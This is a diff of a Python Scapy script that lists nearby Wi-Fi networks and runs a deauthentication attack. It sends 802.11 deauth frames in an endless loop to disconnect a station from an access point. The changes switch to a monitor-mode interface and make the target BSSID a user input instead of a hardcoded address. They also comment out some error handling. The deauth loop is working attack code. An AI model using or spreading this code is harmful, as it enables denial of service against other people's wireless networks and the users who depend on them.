@@ -9,7 +9,7 @@ import random
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
 # set the index BSSID (MAC address of the AP)
 networks.set_index("BSSID", inplace=True)
-interface = "wlan0"
+interface = "wlan0mon"
 def callback(packet):
 	if packet.haslayer(Dot11Beacon):
 		# extract the MAC address of the network
@@ -35,7 +35,7 @@ def disconnect(_ap, _st):
 	pkt = RadioTap() / Dot11(addr1=_st, addr2=_ap, addr3=_ap) / Dot11Deauth(reason=2)
 	while True:	
 		# print("hell")
-		sendp(pkt, iface="wlan0", verbose=False)
+		sendp(pkt, iface="wlan0mon", verbose=False)
 
 def findBSS(bssid_diconnect):
             print ("Disconnecting: %s" % bssid_diconnect)
@@ -63,18 +63,18 @@ def print_all():
 	# if stop_threads:
 	# 	pass
 	while True:
-		try:
-			global stop_threads
-			if stop_threads:
-				break
-			os.system("clear")
-			print(networks)
-			time.sleep(0.2)
+		# try:
+		global stop_threads
+		if stop_threads:
+			break
+		os.system("clear")
+		print(networks)
+		time.sleep(0.2)
 
                 # while True: time.sleep(3)
-		except KeyboardInterrupt:
-			break
-			findBSS("bc:8a:e8:06:b7:d6")
+		# except KeyboardInterrupt:
+		# 	break
+		# 	# findBSS("bc:8a:e8:06:b7:d6")
 			
 #   print '\n! Received keyboard interrupt, quitting threads.\n'
         # except (KeyboardInterrupt, SystemExit):
@@ -83,7 +83,9 @@ def print_all():
 
 if __name__ == "__main__":
 	# interface name, check using iwconfig
-	interface = "wlan0"
+	
+	# interface = "wlan0mon"
+	interface  = input("Enter the monitor mode wifi interface name: ")
 	# start the thread that prints all the networks
 			# start the channel changer
 	channel_changer = Thread(target=change_channel)
@@ -107,4 +109,5 @@ if __name__ == "__main__":
 				# while True: time.sleep(1.0)
 				stop_threads = True
 				bssid = input("Enter the BSSID(or Mac) of AP to disconnect: ")
-				findBSS("bc:8a:e8:06:b7:d6")
+				findBSS(bssid)
+				# stop_packet=True
